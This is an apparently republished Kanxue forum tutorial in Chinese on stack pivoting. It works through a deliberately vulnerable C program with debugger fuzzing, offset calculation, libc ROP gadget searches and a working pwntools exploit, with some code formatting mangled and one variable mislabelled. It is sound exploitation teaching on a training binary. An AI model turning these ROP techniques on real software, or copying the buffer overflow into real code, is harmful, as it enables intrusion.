---
title: 一个简单实践理解栈空间转移
url: https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458500315&idx=1&sn=19b12ab150dd49325f93ae9d73aef0c4&chksm=b18e8c5186f90547f3b615b160d803a320c103d9d892c7253253db41124ac6993d83d13c5789&scene=58&subscene=0#rd
source: 看雪学苑
date: 2023-03-31
fetch_date: 2025-10-04T11:15:20.040215
---

# 一个简单实践理解栈空间转移

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8ETRoCScGHH55IwbOU6syQibndZknW0cMqMEaLjBgnFJs1BGJIe5iarthKbMck9aR6kgpiaQVsnh29jQ/0?wx_fmt=jpeg)

# 一个简单实践理解栈空间转移

winsunxs

看雪学苑

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8ETRoCScGHH55IwbOU6syQibZic5pEQea5mteQyFPFc3yon1hOAicmiaZRTPQibTOpI3wVmlgs2Vl6q6Lw/640?wx_fmt=jpeg)

本文为看雪论坛优秀文章

看雪论坛作者ID：winsunxs

# **1 what**

stack pivoiting是一种栈空间转移技术。

#

# **2 why**

有时候缓冲区有长度限制，不利于在栈上配置rop gadget(空间不够)！

#

# **3 how**

##

## 3.1 pop rsp gadget

这种情形比较少见，遇到了相当幸运。

##

## 3.2 xchg <reg>, rsp

```
pop <reg>                <=== return pointer<reg value>xchg <rag>, rsp
```

##

## 3.3 leave;ret

leave相当于：

```
mov rsp,rbppop rbp
```

加上ret就等于：

```
mov rsp,rbppop rbppop rip
```

覆盖rbp，然后栈中的rip覆盖为Addr(leave;ret)，当接收数据的函数返回时候，rsp指向target，target新栈中保留了待执行shellcode。

#

# **4 漏洞程序 vuln**

```
// gcc source.c -o vuln -no-pie#include <stdio.h> void winner(int a, int b) {    if(a == 0xdeadbeef && b == 0xdeadc0de) {        puts("Great job!");        return;    }    puts("Whelp, almost...?");} void vuln() {    char buffer[0x60];    printf("Try pivoting to: %p\n", buffer);    fgets(buffer, 0x80, stdin);} int main() {    vuln();    return 0;}
```

#

# 4.1 vuln脆弱性

# 存在输入性栈溢出，buffer大小0x60。

# fgets存在输入大小限制，0x80上界。

# 程序编译保护存在,nx。

```
─$ checksec --file=./vuln[*] '/home/kali/exploits/spivot/vuln'  Arch:     amd64-64-little  RELRO:    Partial RELRO  Stack:    No canary found  NX:       NX enabled  PIE:      No PIE (0x400000)
```

#

# 4.2 vuln脆弱性利用目标

#

# rip指向 winner函数，获取winner函数的执行权

##

## 4.3 vuln利用步骤

###

### 4.3.1 测算rip的偏移

###

### ① 生成de bruijn串

```
└─$ ragg2 -P 200 -rAAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2AA3AA4AA5AA6AA7AA8AA9AA0ABBABCABDABEABFA
```

###

### ② fuzz vuln

```
┌──(kali㉿kali)-[~/exploits/spivot]└─$ r2 -d -A vuln[x] Analyze all flags starting with sym. and entry0 (aa)[x] Analyze function calls (aac)[x] Analyze len bytes of instructions for references (aar)[x] Finding and parsing C++ vtables (avrr)[x] Skipping type matching analysis in debugger mode (aaft)[x] Propagate noreturn information (aanr)[ ] Use -AA or aaaa to perform additional experimental anal[x] Use -AA or aaaa to perform additional experimental analysis.[0x7f93b6df79c0]> dcTry pivoting to: 0x7ffcd3256000AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2AA3AA4AA5AA6AA7AA8AA9AA0ABBABCABDABEABFA[+] SIGNAL 11 errno=0 addr=0x00000000 code=128 si_pid=0 ret=0
```

###

### ③ 确定rip偏移

```
[0x004011c5]> dr rbp0x4169414168414167[0x004011c5]> wopO `dr rbp`96
```

### 所以，rip的偏移是104 = 96 + 8

###

### ④ 猜测栈基本布局

###

### stack ::= |+00 buffer | +96 rbp | +104 rip | +112 x1 | +120 x2 | +128 x3 |

因为fgets输入长度限制是0x80==128,而且，栈不可执行shellcode，所以，可以覆盖的区域只有 rip，x1，x2 三个变量的地址，且只能用rop gadget方式。

###

### 4.3.2 寻找可用gadget

###

### pop rdi

```
──(kali㉿kali)-[~/exploits/spivot]└─$ ROPgadget --binary vuln  | grep   'pop rdi'
```

很不幸，vuln程序中找不到类似pop rdi ｜ pop rsi等指令，只能去libc找一个用用。

libc找gadget的前提是ASLR已经关闭：

```
──(kali㉿kali)-[~/exploits/spivot]└─$ cat /proc/sys/kernel/randomize_va_space0
```

ROPgadget寻找libc

```

└─$ ldd vuln

```
linux-vdso.so.1 (0x00007ffff7fc9000)libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7dce000)/lib64/ld-linux-x86-64.so.2 (0x00007ffff7fcb000)
```

┌──(kali㉿kali)-[~/exploits/spivot]

└─$ ROPgadget --binary /lib/x86\_64-linux-gnu/libc.so.6 | grep 'pop rdi ; ret'
0x0000000000027725 : pop rdi ; ret
0x0000000000065b7d : pop rdi ; ret 0x16

```
所以，**POP_RDI = 0x00007f85682b0000 + 0x027725** 2. pop rsi
```

┌──(kali㉿kali)-[~/exploits/spivot]

└─$ ROPgadget --binary /lib/x86\_64-linux-gnu/libc.so.6 | grep 'pop rsi ; ret'
0x0000000000028ed9 : pop rsi ; ret
0x0000000000085336 : pop rsi ; retf

```
所以，**POP_RSI = 0x00007f85682b0000 + 0x028ed9** 3. pop rsp
```

┌──(kali㉿kali)-[~/exploits/spivot]

└─$ ROPgadget --binary /lib/x86\_64-linux-gnu/libc.so.6 | grep 'pop rsp'
...
0x00000000000fd999 : pop rsp ; jmp 0xfd8e0
0x00000000000ff3b6 : pop rsp ; jmp 0xff1c0
0x00000000000db8b8 : pop rsp ; jmp 0xffffffff8552b8cd
...
0x00000000000273aa : pop rsp ; ret

```
所以，**POP_RSP = 0x00007f85682b0000 + 0x0273aa** ### 4.3.3 规划栈布局 - **old_stack ::= |+00 buffer | +96 rbp |  +104 rip | +112  x1 |  +120 x2 | +128 x3 |** new_stack ::= | 新栈布局     ||  :---:      || +00 POP_RDI         || +08 0xdeadbeef   || +16 POP_RSI      || +24 0xdeadc0de   || +32 winner_addr  || ...              || +104 POP_RSP (rip位置)    || +112 Buffer_addr | ### 4.3.4 pwntools编写利用代码
```

from pwn import \*

elf = context.binary = ELF('./vuln')

p = process()

#

# **获取buffer\_addr**

p.recvuntil('to: ')
py = int(p.recvline(),16)
log.info(f'leak buffer addr: {hex(buffer\_addr)}')

LIBC = 0x00007ffff7dce000
POP\_RSP = LIBC + 0x0273aa
POP\_RDI = LIBC + 0x027725
POP\_RSI = LIBC + 0x028ed9

#

# **设置payload**

payload = flat(POP\_RDI,0xdeadbeef,POP\_RSI,0xdeadc0de,elf.sym['winner'])
payload = payload.ljust(104,b'A')
payload += flat(POP\_RSP,buffer\_addr)

#

# **send payload**

p.sendline(payload)

print(p.recvline())

```
### exploit output
```

└─$ python exploit.py

[] '/home/kali/exploits/spivot/vuln'
Arch: amd64-64-little
RELRO: Partial RELRO
Stack: No canary found
NX: NX enabled
PIE: No PIE (0x400000)
[+] Starting local process '/home/kali/exploits/spivot/vuln': pid 1171678
[] leak buffer addr: 0x7fffffffe280
[] Paused (press any to continue)
b'Great job!\n'
[] Stopped process '/home/kali/exploits/spivot/vuln' (pid 1171678)
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HSBAkx44BvNgDiacX7ia4Eg8Dj57sYjVVLIvcOf1BNJI2ZteAsttLHblEe0a0r57w272JWyia9jOYCA/640?wx_fmt=png)

**看雪ID：winsunxs**

https://bbs.kanxue.com/user-home-107472.htm

\*本文由看雪论坛 winsunxs 原创，转载请注明来自看雪社区

[![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FJjl92zYviaHbyrEZEZzyZFOjibI9RsDgTicPv5dSuE7FmbcRjV9sn7Y7qDnx1icFuO45cIj22DLEZDQ/640?wx_fmt=png)](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458499288&idx=1&sn=b2b9cd6ff7388a8658d254e13c72f9ad&chksm=b18e885286f9014436a590f2531fda167be67e1e227ea395812968e828932bd44eade34b0dbf&scene=21#wechat_redirect)

**#****往期推荐**

1、[Realworld CTF 2023 ChatUWU 详解](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458499288&idx=2&sn=cb04969bed75f826d5b9effd3ef47d93&chksm=b18e885286f901445c4bf1c868b51ccb423c8c9b7027e9908f11f8153ce3068a965e04fb808e&scene=21#wechat_redirect)

2、[安卓协议逆向 cxdx 分析与实现](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458499198&idx=1&sn=a16261bef71086a0eee931d5709f294f&chksm=b18e88f486f901e22359f08e9668b7e9348d8c8e15caf535774bc4ac637c0dec6e384005bb55&scene=21#wechat_redirect)

3、[Kernel PWN从入门到提升](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458499012&idx=1&sn=cc2bec22b8100661d3be4914e2cac64a&chksm=b18e874e86f90e58b02344269b99dc2f451d5f855c3288b328da9c9747640b3ccbfb7ba8d45b&scene=21#wechat_redirect)

4、[Kernel PWN-开启smap保护的babydrive](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458498982&idx=2&sn=bc108408437309cdee3a654dff730d44&chksm=b18e872c86f90e3adfdc7ea68c8ee2a5bf68a759c123ac037047b32138eb153b5b9a8593c74d&scene=21#wechat_redirect)

5、[【详解】CTFHUB-FastBin Attack](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458498963&idx=1&sn=993867aa6c42f4c5b0b28fd3a323b9ad&chksm=b18e871986f90e0f45ae967dc65c086d027eae52c31b4af07bda217aa98c4a0084ffdcab73d3&scene=21#wechat_redirect)

6、[Relocate、PLT、GOT And Lazy Binding](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458498698&idx=1&sn=f158b2958ca048423e10123368f5a58b&chksm=b18e860086f90f169490f11dc8c2f084b3c3f691e53bdf410db49c16c4ba7cb24e0b78c7b8e7&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_jpg/Uia4617poZXP96fGaMPXib13V1bJ52yHq9ycD9Zv3WhiaRb2rKV6wghrNa4VyFR2wibBVNfZt3M5IuUiauQGHvxhQrA/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8EbEJaHl4j4oA4ejnuzPAicdP7bNEwt8Ew5l2fRJxWETW07MNo7TW5xnw60R9WSwic...